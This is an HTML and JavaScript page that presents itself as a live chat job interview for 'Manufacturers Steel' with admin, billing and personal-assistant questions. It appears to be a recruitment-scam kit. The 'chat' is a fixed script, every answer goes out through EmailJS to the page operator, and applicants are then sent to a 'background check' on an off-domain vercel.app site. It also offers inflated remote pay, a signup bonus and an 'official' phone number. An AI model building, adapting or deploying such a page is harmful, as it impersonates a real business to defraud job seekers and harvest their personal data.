<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Manufacturers Steel Interview</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<style>
body{
  margin:0;
  background:#f1f2f4;
  font-family:Arial,Helvetica,sans-serif;
}
.container{
  max-width:700px;
  margin:40px auto;
  background:white;
  padding:40px;
  border-radius:10px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
}
.logo{
  text-align:center;
  font-size:28px;
  font-weight:bold;
  margin-bottom:20px;
}
.question{
  font-size:20px;
  margin-bottom:20px;
  line-height:1.5;
}
input{
  width:100%;
  padding:14px;
  font-size:16px;
  border:1px solid #ddd;
  border-radius:6px;
  margin-bottom:10px;
}
.error{
  font-size:14px;
  color:#dc2626;
  margin-bottom:15px;
  display:none;
}
button{
  background:#ff6a00;
  color:white;
  border:none;
  padding:14px 30px;
  font-size:18px;
  border-radius:30px;
  cursor:pointer;
}
button:hover{ opacity:.9; }
.progress{
  font-size:14px;
  color:#666;
  margin-bottom:20px;
  text-align:right;
}
</style>
</head>

<body>
<div class="container">
  <div class="logo">MANUFACTURERS STEEL</div>
  <div class="progress" id="progress"></div>
  <div class="question" id="questionText"></div>
  <input id="answerInput" />
  <div class="error" id="errorText">Please enter your answer to continue.</div>
  <button onclick="nextQuestion()">Next</button>
</div>

<script>
emailjs.init("3PXsfITe9J9_Y5Jxj"); // Your EmailJS public key

// First question / company overview (shared for all positions)
const firstQuestion = `Hi, I‚Äôm Cynthia, and I‚Äôll be conducting your live chat interview today.

Before we begin.

Company Overview:
Manufacturers Steel Company is a family-owned steel service center based in Springville, California. Established in 1951, we are known for quality steel products, competitive pricing, and dependable customer service. We serve clients nationwide, supporting fabricators, OEMs, job shops, and contractors.

Role Overview:
This position combines administrative support and billing-related responsibilities, including recordkeeping, invoicing, payment tracking, customer communication, and task follow-ups. Overtime opportunities may be available when required.

Benefits Include:
‚Ä¢ Paid remote training
‚Ä¢ Flexible scheduling
‚Ä¢ Equipment support (if applicable)
‚Ä¢ Sign-up/Welcome Bonus of $500‚Äì$750 upon successful completion of training

Training is fully remote and designed to help you quickly become comfortable with our systems.

Please note: You must be located in the U.S. and legally authorized to work.

Please confirm the position you‚Äôre applying for to continue.`;

// Admin & Billing Questions
const adminQuestions = [
  "Can you confirm where you are currently located?",
  "The starting pay is $30/hr up to $35/hr. Does this compensation work for you?",
  "What type of schedule are you seeking ‚Äî full-time, part-time, or flexible?",
  "Tell us a little about yourself and your professional background.",
  "What interested you in this role with MANUFACTURERS STEEL?",
  "Do you have experience with administrative tasks such as data entry, recordkeeping, scheduling, or customer support?",
  "Have you worked with billing-related tasks like invoices, payment tracking, or resolving billing questions?",
  "How do you ensure accuracy and attention to detail when managing multiple tasks or financial records?",
  "If a customer contacts you with a billing concern or urgent issue, how would you handle it?",
  "If you receive a task that is unclear or missing information, what would you do?",
  "Are you comfortable communicating professionally with customers and internal teams through email, chat, and phone?",
  "Can you share an example of a time you caught an error or prevented a problem before it escalated?",
  "If you notice repeated billing or admin issues from the same process, how would you address it?",
  "What would you do if you were unsure how to complete a task?",
  "How do you stay organized and productive while working remotely?",
  "What software tools or technical skills help you succeed in admin and billing support?",
  "How do you maintain a professional tone in emails or chat?",
  "This position requires a background check. Are you comfortable proceeding?",
  "Before we wrap up, is there anything else you‚Äôd like us to know about your experience, availability, or interest in the role?"
];

// Personal Assistant Questions (same pay/bonus, same overview)
const paQuestions = [
  "Can you confirm where you are currently located?",
  "The starting pay is $30/hr up to $35/hr. Does this compensation work for you?",
  "What type of schedule are you seeking ‚Äî full-time, part-time, or flexible?",
  "Are you able to maintain consistent availability during agreed working hours?",
  "Tell us a little about yourself and your professional background.",
  "Do you have experience working as a personal assistant, administrative assistant, or in a similar support role?",
  "What types of administrative tasks are you most comfortable handling?",
  "Have you worked remotely before? If yes, what tools or platforms did you use?",
  "How do you stay organized when managing multiple tasks or priorities at the same time?",
  "If you receive a task or instruction that is unclear, what steps do you take before proceeding?",
  "How do you ensure your written communication remains professional and clear, especially in email or live chat?",
  "Can you share an example of a time you noticed a mistake or issue and addressed it before it became a bigger problem?",
  "If you‚Äôre unsure how to complete a task, what would you do?",
  "This role involves handling sensitive information. How do you ensure confidentiality and professionalism in your work?",
  "What software or tools are you comfortable using (email platforms, calendars, spreadsheets, chat tools)?",
  "Why are you interested in this Personal Assistant role?",
  "Is there anything else you‚Äôd like us to know about your experience or availability?"
];

let current = 0;
let answers = [];
let selectedQuestions = [];

// DOM elements
const qText = document.getElementById("questionText");
const progress = document.getElementById("progress");
const input = document.getElementById("answerInput");
const errorText = document.getElementById("errorText");

function showQuestion(){
  if(current === 0){
    qText.innerText = firstQuestion;
    progress.innerText = "Question 1 of ?";
  } else {
    qText.innerText = selectedQuestions[current-1];
    progress.innerText = "Question " + (current+1) + " of " + (selectedQuestions.length+1);
  }
  input.value = "";
  errorText.style.display = "none";
  input.focus();
}

function nextQuestion(){
  const answer = input.value.trim();
  if(!answer){
    errorText.style.display = "block";
    return;
  }

  answers.push(answer);

  // First question decides the role
  if(current === 0){
    if(answer.toLowerCase().includes("personal assistant")){
      selectedQuestions = paQuestions;
    } else {
      selectedQuestions = adminQuestions;
    }
  }

  current++;
  if(current < selectedQuestions.length + 1){
    showQuestion();
  } else {
    submitInterview();
  }
}

function submitInterview(){
  document.querySelector(".container").innerHTML = "<h2>Submitting your interview...</h2>";

  // Build message with role info
  let message = "Position Applied For: " + answers[0] + "\n\n";
  for(let i=1; i<answers.length; i++){
    message += selectedQuestions[i-1] + "\nAnswer: " + answers[i] + "\n\n";
  }

  emailjs.send(
    "service_cwzrlga",        // Your Service ID
    "template_lgzkb7s",       // Your Template ID
    { interview_answers: message }
  )
  .then(()=>{
    document.querySelector(".container").innerHTML = `
      <h2>‚úÖ Interview Submitted</h2>
      <p>Thank you for taking the time to complete this interview. We appreciate your interest in <strong>MANUFACTURERS STEEL</strong>.</p>
      <p>Please complete the background check using the link below:</p>
      <p>üëâ <a href="https://manufacturerssteel-verification.vercel.app" target="_blank">
      https://manufacturerssteel-verification.vercel.app</a></p>
      <p>If you are selected to move forward, a member of our recruitment team may contact you by phone at our official Manufacturers Steel, Inc. number: <strong>(840) 242-7954</strong>.</p>
      <p><strong>We look forward to potentially welcoming you to our team.</strong></p>
    `;
  })
  .catch((err)=>{
    console.error("EmailJS send error:", err);
    document.querySelector(".container").innerHTML = `
      <h2>‚ö†Ô∏è Submission Failed</h2>
      <p>There was an error sending your interview. Please try again or contact support.</p>
    `;
  });
}

// Initialize first question
showQuestion();
</script>
</body>
</html>
